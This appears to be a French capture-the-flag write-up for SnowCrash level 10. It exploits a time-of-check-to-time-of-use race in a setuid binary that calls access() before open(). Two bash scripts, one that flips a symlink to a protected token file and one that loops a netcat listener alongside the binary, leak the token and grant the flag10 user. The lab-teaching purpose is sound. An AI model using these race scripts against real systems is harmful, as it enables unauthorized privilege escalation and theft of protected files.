# Level 10

```bash
level10@SnowCrash:~$ ls -l 
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Une fois l'executable dessassembler sur dogbolt nous pouvons voir qu'il va se connecter sur le port 6969 et surtout utiliser 'access' sur le fichier donner en parametre avant d'essayer de l'ouvrir dont le man mentionne ceci:

```bash
Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time
interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer  alternative  would  be  to
temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

Ce qui veut dire que l'executable possede une vulnerabilite TOCTOU (Time-of-check to time-of-use) la maniere de l'exploiter est ceci:

```bash
level10@SnowCrash:~$ cat /tmp/race.sh
#!/bin/bash

echo 'file' > /tmp/file

while true; do
	ln -fs /tmp/file /tmp/link
    ln -fs ~/token /tmp/link
done

level10@SnowCrash:~$ cat /tmp/exploit.sh
#! /bin/bash

while true; do
	nc -l 6969 & ~/level10 /tmp/link 0.0.0.0
done
```

Et il nous reste plus qu'a executer les deux scripts en meme temps:

```bash
level10@SnowCrash:~$ /tmp/race.sh & /tmp/exploit.sh
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : ****************
```